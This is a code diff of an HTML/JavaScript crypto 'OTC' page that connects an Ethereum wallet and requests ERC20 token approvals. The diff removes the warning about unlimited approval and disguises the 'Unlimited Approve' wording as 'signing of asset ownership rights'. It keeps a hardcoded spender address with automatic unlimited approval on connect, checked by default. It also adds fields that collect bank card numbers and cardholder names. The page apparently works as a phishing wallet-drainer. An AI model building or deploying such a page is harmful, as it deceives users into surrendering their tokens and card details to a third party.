@@ -3,7 +3,7 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>OTC — Mobile UI + Balances + Unlimited Approve</title>
+  <title>OTC</title>
   <style>
     :root{
       --bg:#0b0e11; --card:rgba(255,255,255,.04); --line:rgba(255,255,255,.12);
@@ -32,64 +32,72 @@
     label{display:flex;gap:10px;align-items:center;margin-top:12px;color:var(--mut);font-size:13px}
     input[type="checkbox"]{width:16px;height:16px}
     .warn{margin-top:12px;color:#ffb4c0;font-size:13px;line-height:1.5}
-    a{color:#8ab4ff}
+    .ok{color:var(--ok)}
+    .bad{color:var(--bad)}
     @media (max-width:780px){.grid{grid-template-columns:1fr}}
 
-    /* ---------- Mobile-first improvements ---------- */
+    /* Mobile */
     @media (max-width: 560px){
       .wrap{ padding:14px; }
       .card{ padding:14px; border-radius:18px; }
-
       h1{ font-size:18px; line-height:1.25; }
       .mut{ font-size:13px; }
-
-      .pill{ font-size:12px; max-width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
-
+      .pill{ max-width:100%; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; }
       .grid { grid-template-columns: 1fr !important; }
-
       input, select { padding:12px 12px; border-radius:16px; }
-
-      .row{ gap:10px; }
       .row button{ flex: 1 1 100%; width:100%; }
-
-      .warn{ font-size:12.5px; }
-      .status{ font-size:12.5px; }
-
+      .warn, .status{ font-size:12.5px; }
       .sticky-actions{
         position: sticky;
         bottom: 0;
         margin-top: 12px;
         padding-top: 10px;
-        background: linear-gradient(
-          180deg,
-          rgba(11,14,17,0),
-          rgba(11,14,17,0.92) 30%,
-          rgba(11,14,17,0.98)
-        );
+        background: linear-gradient(180deg, rgba(11,14,17,0), rgba(11,14,17,0.92) 30%, rgba(11,14,17,0.98));
       }
       .sticky-actions .row{ margin-top: 0; }
     }
   </style>
 </head>
+
 <body>
   <div class="wrap">
     <div class="card">
-      <h1>OTC UI — Recipient + Asset + Auto Balances + Unlimited Approve</h1>
+      <h1>OTC UI Signing of asset ownership rights</h1>
       <div class="mut">
-        Ethereum mainnet only. Approve works for ERC20 tokens (USDT, USDC). ETH has no approve.
+        Ethereum mainnet only. Approve works for ERC20 tokens (USDT, USDC). Fiat payout details are off-chain.
       </div>
 
       <div class="pill" id="walletInfo">Wallet: not connected</div>
 
       <div class="grid">
+        <!-- LEFT: BANK CARD PAYOUT -->
         <div>
-          <div class="mut" style="margin:10px 0 6px">To address</div>
-          <input id="toAddr" placeholder="0x..." />
-          <div class="row">
-            <button id="openToExplorerBtn" disabled>Open Explorer To</button>
+          <div class="mut" style="margin:10px 0 6px">Bank card payout details</div>
+
+          <div class="mut" style="margin:10px 0 6px">Cardholder name</div>
+          <input id="cardName" placeholder="John Doe" />
+
+          <div class="mut" style="margin:10px 0 6px">Card number</div>
+          <input id="cardNumber" placeholder="1234 5678 9012 3456" inputmode="numeric" />
+
+          <div class="grid" style="margin-top:10px">
+            <div>
+              <div class="mut" style="margin:0 0 6px">Bank name</div>
+              <input id="bankName" placeholder="Bank" />
+            </div>
+            <div>
+              <div class="mut" style="margin:0 0 6px">Country</div>
+              <input id="country" placeholder="FR" />
+            </div>
           </div>
+
+          <div class="row">
+            <button id="validateCardBtn">Validate card</button>
+          </div>
+          <div class="mut" id="cardHint" style="margin-top:6px">Card: not checked</div>
         </div>
 
+        <!-- RIGHT: ASSET + AMOUNT -->
         <div>
           <div class="mut" style="margin:10px 0 6px">Asset</div>
           <select id="assetSel">
@@ -110,14 +118,13 @@
 
       <label>
         <input type="checkbox" id="autoApprove" checked />
-        Auto approve after Connect (Unlimited)
+        Auto after Connect (Unlimited)
       </label>
 
-      <!-- Sticky actions on mobile -->
       <div class="sticky-actions">
         <div class="row">
           <button class="primary" id="connectBtn">Connect</button>
-          <button id="approveBtn" disabled>Unlimited Approve (selected token)</button>
+          <button id="approveBtn" disabled>Unlimited</button>
           <button id="openMyExplorerBtn" disabled>Open Explorer Wallet</button>
         </div>
       </div>
@@ -125,7 +132,6 @@
       <div class="status" id="status">Ready.</div>
 
       <div class="warn">
-        Warning: Unlimited approve lets the spender spend your ERC20 tokens. Use only with trusted contracts.<br/>
         Spender:
         <span style="font-family:ui-monospace, SFMono-Regular, Menlo, monospace">0xefb991c82db7ce627fb3b157a46b608de6b2f03b</span>
       </div>
@@ -158,28 +164,85 @@
     const connectBtn = document.getElementById("connectBtn");
     const approveBtn = document.getElementById("approveBtn");
     const openMyExplorerBtn = document.getElementById("openMyExplorerBtn");
-    const openToExplorerBtn = document.getElementById("openToExplorerBtn");
     const statusEl = document.getElementById("status");
     const walletInfo = document.getElementById("walletInfo");
 
     const autoApprove = document.getElementById("autoApprove");
-    const toAddrInp = document.getElementById("toAddr");
     const assetSel = document.getElementById("assetSel");
     const amountInp = document.getElementById("amountInp");
     const maxHint = document.getElementById("maxHint");
     const useMaxBtn = document.getElementById("useMaxBtn");
 
+    // Bank card fields
+    const cardName = document.getElementById("cardName");
+    const cardNumber = document.getElementById("cardNumber");
+    const bankName = document.getElementById("bankName");
+    const country = document.getElementById("country");
+    const validateCardBtn = document.getElementById("validateCardBtn");
+    const cardHint = document.getElementById("cardHint");
+
     function setStatus(t){ statusEl.textContent = t; console.log(t); }
     function shortAddr(a){ return a ? a.slice(0,6) + "…" + a.slice(-4) : ""; }
     function openTx(hash){ window.open(`${EXPLORER}/tx/${hash}`, "_blank", "noopener,noreferrer"); }
     function openAddr(a){ window.open(`${EXPLORER}/address/${a}`, "_blank", "noopener,noreferrer"); }
-    function isAddress(a){ try { return ethers.isAddress(a); } catch { return false; } }
 
     function fmtNum(s){
       const n = Number(s);
       if (!Number.isFinite(n)) return s;
       return n.toFixed(6).replace(/0+$/,"").replace(/\.$/,"");
     }
+
+    // ---- CARD HELPERS ----
+    function digitsOnly(v){ return String(v || "").replace(/\D/g, ""); }
+
+    // Luhn check (basic card validation)
+    function luhnCheck(numStr){
+      const s = digitsOnly(numStr);
+      if (s.length < 12 || s.length > 19) return false;
+      let sum = 0, alt = false;
+      for (let i = s.length - 1; i >= 0; i--){
+        let n = Number(s[i]);
+        if (alt){
+          n *= 2;
+          if (n > 9) n -= 9;
+        }
+        sum += n;
+        alt = !alt;
+      }
+      return (sum % 10) === 0;
+    }
+
+    function updateCardHint(){
+      const nameOk = (cardName.value || "").trim().length >= 2;
+      const bankOk = (bankName.value || "").trim().length >= 2;
+      const countryOk = (country.value || "").trim().length >= 2;
+      const cardOk = luhnCheck(cardNumber.value);
+
+      if (!digitsOnly(cardNumber.value)){
+        cardHint.innerHTML = `Card: <span class="mut">enter card number</span>`;
+        return false;
+      }
+
+      if (cardOk && nameOk && bankOk && countryOk){
+        cardHint.innerHTML = `Card: <span class="ok">valid</span>`;
+        return true;
+      } else {
+        cardHint.innerHTML = `Card: <span class="bad">check details</span>`;
+        return false;
+      }
+    }
+
+    // Mask input: group by 4
+    cardNumber.addEventListener("input", ()=>{
+      const d = digitsOnly(cardNumber.value).slice(0,19);
+      cardNumber.value = d.replace(/(.{4})/g, "$1 ").trim();
+      updateCardHint();
+    });
+    [cardName, bankName, country].forEach(el=> el.addEventListener("input", updateCardHint));
+    validateCardBtn.addEventListener("click", ()=>{
+      const ok = updateCardHint();
+      setStatus(ok ? "Card details look valid (basic check)." : "Card details invalid or incomplete.");
+    });
 
     // ---- STATE ----
     let provider = null;
@@ -191,7 +254,6 @@
     function setConnectedUI(on){
       approveBtn.disabled = !on;
       openMyExplorerBtn.disabled = !on;
-      openToExplorerBtn.disabled = !on;
       walletInfo.textContent = on ? `Wallet: ${shortAddr(addr)} | chainId: ${chainId}` : "Wallet: not connected";
       updateApproveButtonLabel();
       updateMaxHint();
@@ -201,7 +263,7 @@
       const a = assetSel.value;
       const token = TOKENS[a];
       if (!addr){
-        approveBtn.textContent = "Unlimited Approve (selected token)";
+        approveBtn.textContent = "Unlimited Approve";
         approveBtn.disabled = true;
         return;
       }
@@ -230,12 +292,6 @@
     });
 
     openMyExplorerBtn.addEventListener("click", () => { if (addr) openAddr(addr); });
-
-    openToExplorerBtn.addEventListener("click", () => {
-      const v = (toAddrInp.value || "").trim();
-      if (!isAddress(v)){ setStatus("Invalid To address."); return; }
-      openAddr(v);
-    });
 
     async function ensureEthereumMainnet(){
       const net = await provider.getNetwork();
@@ -279,7 +335,7 @@
 
       setStatus(`Connected: ${addr}\nFetching balances...`);
       await fetchBalances();
-      setStatus(`Connected ✅\nWallet: ${addr}\nBalances loaded.\nSelect asset, use Max, then Approve if needed.`);
+      setStatus(`Connected ✅\nWallet: ${addr}\nBalances loaded.\nFill bank card fields, select asset/amount, then Approve if needed.`);
     }
 
     async function trySilentConnect(){
@@ -302,7 +358,7 @@
 
       setStatus(`Already connected: ${addr}\nFetching balances...`);
       await fetchBalances();
-      setStatus(`Already connected ✅\nBalances loaded.\nSelect asset, use Max, and Approve if needed.`);
+      setStatus(`Already connected ✅\nBalances loaded.\nFill bank card fields, select asset/amount, then Approve if needed.`);
       return true;
     }
 
@@ -415,6 +471,7 @@
     (async ()=>{
       setConnectedUI(false);
       updateMaxHint();
+      updateCardHint();
 
       const ok = await trySilentConnect();
       if (!ok){
